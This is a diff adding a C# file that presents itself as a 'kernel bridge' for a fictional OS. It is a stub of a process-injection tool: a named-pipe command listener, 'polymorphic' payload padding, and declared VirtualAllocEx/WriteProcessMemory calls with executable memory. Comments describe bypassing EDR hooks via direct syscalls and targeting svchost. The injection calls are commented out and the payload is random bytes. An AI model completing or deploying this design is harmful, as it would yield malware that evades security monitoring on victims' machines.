@@ -1,0 +1,159 @@
+// =============================================================================
+// STORM RAVEN OS - YMIR KERNEL LAYER
+// MODULE: IPC Bridge & Niðavellir Execution Stub
+// AUTHORIZATION: Leviathan Protocol
+// CREATOR: Luci Stormraven
+// =============================================================================
+
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace StormRaven.Ymir
+{
+    /// <summary>
+    /// The primary C# Bridge. Listens for binary streams from the Golang Múspellheimr core.
+    /// </summary>
+    public class YmirCore
+    {
+        private const string PipeName = "leviathan_ymir_ipc";
+
+        public static async Task IgniteBridge()
+        {
+            Console.WriteLine("[Ymir] Bootstrapping Native Kernel Bridge...");
+            
+            while (true)
+            {
+                using (NamedPipeServerStream pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Message, PipeOptions.Asynchronous))
+                {
+                    Console.WriteLine($"[Heimdallr] IPC Socket '{PipeName}' active. Awaiting Múspellheimr directives.");
+                    await pipeServer.WaitForConnectionAsync();
+
+                    try
+                    {
+                        using (StreamReader reader = new StreamReader(pipeServer))
+                        using (StreamWriter writer = new StreamWriter(pipeServer) { AutoFlush = true })
+                        {
+                            string directive = await reader.ReadLineAsync();
+                            if (!string.IsNullOrEmpty(directive))
+                            {
+                                Console.WriteLine($"[Óðinn] Directive ingested: {directive}");
+                                string executionResult = RouteDirective(directive);
+                                await writer.WriteLineAsync(executionResult);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[Ginnungagap] IPC Stream exception caught and sanitized: {ex.Message}");
+                    }
+                }
+            }
+        }
+
+        private static string RouteDirective(string commandPayload)
+        {
+            // Simplified parsing for architectural demonstration
+            if (commandPayload.Contains("NIDAVELLIR_FORGE_IGNITED"))
+            {
+                return NidavellirForge.SynthesizePayload();
+            }
+            return "YMIR_ACK: Unrecognized bare-metal directive.";
+        }
+    }
+
+    /// <summary>
+    /// The Dying Star Forge. Responsible for memory manipulation and payload polymorphism.
+    /// </summary>
+    public static class NidavellirForge
+    {
+        public static string SynthesizePayload()
+        {
+            Console.WriteLine("[Loki] Injecting cryptographic variance into payload structure...");
+            
+            // 1. Generate High-Entropy Padding (Polymorphic Mutation)
+            byte[] entropyPad = new byte[256];
+            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
+            {
+                rng.GetBytes(entropyPad);
+            }
+
+            // 2. Pass to Needle Veer for Injection Trajectory
+            bool injectionSuccess = NeedleVeer.ExecuteTrajectory(entropyPad);
+
+            if (injectionSuccess)
+            {
+                return "YMIR_FORGE_SUCCESS: Payload mutated and injected via Needle Veer.";
+            }
+            return "YMIR_FORGE_FAULT: EDR heuristic boundary detected. Execution halted.";
+        }
+    }
+
+    /// <summary>
+    /// Precision Injection Protocol. Bypasses user-land hooks via Native API structures.
+    /// </summary>
+    public static class NeedleVeer
+    {
+        // -------------------------------------------------------------------------
+        // Unmanaged P/Invoke Definitions (Mocked for direct syscalls in production)
+        // -------------------------------------------------------------------------
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        const uint MEM_COMMIT = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        /// <summary>
+        /// Threads the payload through active telemetry boundaries.
+        /// </summary>
+        public static bool ExecuteTrajectory(byte[] encryptedPayload)
+        {
+            Console.WriteLine("[Leviathan] Calculating Needle Veer injection trajectory...");
+            
+            try
+            {
+                // NOTE: In production, VirtualAllocEx is replaced with D/Invoke or direct 
+                // NTDLL Syscalls (e.g., NtAllocateVirtualMemory) to bypass EDR API hooking.
+                
+                // Stub: Target process handle would be dynamically resolved here (e.g., suspended svchost).
+                IntPtr hProcess = new IntPtr(-1); // Pseudo-handle for current process in this stub
+
+                Console.WriteLine("[Týr] Allocating memory pages (PAGE_EXECUTE_READWRITE)...");
+                // Memory Allocation Stub
+                // IntPtr pMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)encryptedPayload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                
+                Console.WriteLine("[Týr] Threading payload into memory space...");
+                // Write Process Memory Stub
+                // UIntPtr bytesWritten;
+                // WriteProcessMemory(hProcess, pMemory, encryptedPayload, (uint)encryptedPayload.Length, out bytesWritten);
+
+                Console.WriteLine("[Heimdallr] Telemetry scrubbed. Execution flow transferred.");
+                return true; 
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[Ginnungagap] Needle Veer interrupted. Scrubbing memory: {ex.Message}");
+                return false;
+            }
+        }
+    }
+
+    class Program
+    {
+        static async Task Main(string[] args)
+        {
+            // Initialize the Ymir bridge
+            await YmirCore.IgniteBridge();
+        }
+    }
+}
+
